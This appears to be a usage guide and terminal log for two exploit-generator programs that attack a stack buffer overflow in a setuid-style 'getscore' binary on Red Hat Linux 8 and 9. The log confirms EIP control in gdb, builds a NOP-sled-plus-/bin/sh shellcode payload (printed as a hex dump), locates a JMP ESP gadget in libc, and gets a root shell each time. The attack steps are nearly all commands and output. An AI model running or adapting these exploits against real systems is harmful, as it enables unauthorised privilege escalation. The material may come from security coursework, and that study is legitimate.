How to run:
version 01:
gcc -o exploit_gen_with_esp exploit_gen_with_esp.c
./exploit_gen_with_esp <ESP Value> <EGG Size> <Offset>


version 02 (with indirect jump):
gcc -o exploit_gen_with_jmp_esp exploit_gen_with_jmp_esp.c
./exploit_gen_with_jmp_esp <ldd entry address> <EGG Size>




++++++++++++++ REDHAT 8 ++++++++++++++++++++++++++++++++++++++++++



######## exploit_gen_with_esp ######################

[root@localhost smash-stack]# cat /etc/redhat-release
Red Hat Linux release 8.0 (Psyche)
[root@localhost smash-stack]# EGG=`python -c "print 'A'*160"`
[root@localhost smash-stack]# ./getscore "ABC" $EGG
Segmentation fault (core dumped)
[root@localhost smash-stack]# gdb -core core.24462 
GNU gdb Red Hat Linux (5.2.1-4)
Copyright 2002 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./getscore ABC AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) info registers
eax            0xffffffff	-1
ecx            0xbffff8c0	-1073743680
edx            0xffffffff	-1
ebx            0x4212a2d0	1108517584
esp            0xbffff9d0	0xbffff9d0
ebp            0x41414141	0x41414141
esi            0x40012020	1073815584
edi            0xbffffbd4	-1073742892
eip            0x41414141	0x41414141
eflags         0x10246	66118
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x2b	43
gs             0x2b	43
fctrl          0x0	0
fstat          0x0	0
ftag           0x0	0
fiseg          0x0	0
fioff          0x0	0
foseg          0x0	0
fooff          0x0	0
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) q
[root@localhost smash-stack]# unset EGG
[root@localhost smash-stack]# gcc -o exploit_gen_with_esp exploit_gen_with_esp.c 
exploit_gen_with_esp.c: In function `main':
exploit_gen_with_esp.c:58: warning: return type of `main' is not `int'
[root@localhost smash-stack]# ./exploit_gen_with_esp 0xbffff9d0 160 120
Using sp: 0xbffff9d0
Using EGG size: 160
Using offset: 120
Length of shell code: 46
Using address: 0xbffff958
NOP sled: 80 bytes
[set] RET adds.
[set] NOP adds.
[set] shell code.
unknown terminal "xterm-256color"
unknown terminal "xterm-256color"
[root@localhost smash-stack]# echo $EGG | xxd
0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000010: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000020: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000030: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000040: 9090 9090 9090 9090 9090 9090 eb1f 5e89  ..............^.
0000050: 7608 31c0 8846 0789 460c b00b 89f3 8d4e  v.1..F..F......N
0000060: 088d 560c cd80 31db 89d8 40cd 80e8 dcff  ..V...1...@.....
0000070: ffff 2f62 696e 2f73 68f9 ffbf 58f9 ffbf  ../bin/sh...X...
0000080: 58f9 ffbf 58f9 ffbf 58f9 ffbf 58f9 ffbf  X...X...X...X...
0000090: 58f9 ffbf 58f9 ffbf 58f9 ff0a            X...X...X...
[root@localhost smash-stack]# ./getscore "ABC" $EGG
sh-2.05b# whoami
root
sh-2.05b# exit
exit
[root@localhost smash-stack]#

##################################################


######## exploit_gen_with_jmp_esp ######################

[root@localhost smash-stack]# EGG=`python -c "print 'A'*190"`
[root@localhost smash-stack]# ./getscore "ABC" $EGG
Segmentation fault (core dumped)
[root@localhost smash-stack]# unset EGG
[root@localhost smash-stack]# ldd getscore
	libc.so.6 => /lib/i686/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[root@localhost smash-stack]# gcc -o exploit_gen_with_jmp_esp exploit_gen_with_jmp_esp.c
exploit_gen_with_jmp_esp.c: In function `main':
exploit_gen_with_jmp_esp.c:97: warning: assignment makes integer from pointer without a cast
exploit_gen_with_jmp_esp.c:59: warning: return type of `main' is not `int'
[root@localhost smash-stack]# ./exploit_gen_with_jmp_esp 0x42000000 190
Using search address: 0x42000000
Using EGG size: 190
Length of shell code: 46
Searching JMP ESP...wait...
JMP ESP value: [-1, 0xffffffff], address: [1108462711, 0x4211cc77]
Using address: 0x4211cc77
[set] RET adds.
[set] shell code.
unknown terminal "xterm-256color"
unknown terminal "xterm-256color"
[root@localhost smash-stack]# ./getscore "ABC" $EGG
sh-2.05b# whoami
root
sh-2.05b# exit
exit
[root@localhost smash-stack]# 

##################################################





















++++++++++++++ REDHAT 9 ++++++++++++++++++++++++++++++++++++++++++

######## exploit_gen_with_jmp_esp ######################

[root@localhost smash-stack]# cat /etc/redhat-release
Red Hat Linux release 9 (Shrike
[root@localhost smash-stack]# EGG=`python -c "print 'A'*190"`
[root@localhost smash-stack]# ./getscore "ABC" $EGG
Segmentation fault (core dumped)
[root@localhost smash-stack]# unset EGG
[root@localhost smash-stack]# ldd getscore
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[root@localhost smash-stack]# ./exploit_gen_with_jmp_esp 0x42000000 190
Using search address: 0x42000000
Using EGG size: 190
Length of shell code: 46
Searching JMP ESP...wait...
JMP ESP value: [-1, 0xffffffff], address: [1108487079, 0x42122ba7]
Using address: 0x42122ba7
[set] RET adds.
[set] shell code.
unknown terminal "xterm-256color"
unknown terminal "xterm-256color"
[root@localhost smash-stack]# ./getscore "ABC" $EGG
sh-2.05b# whoami
root
sh-2.05b# exit
exit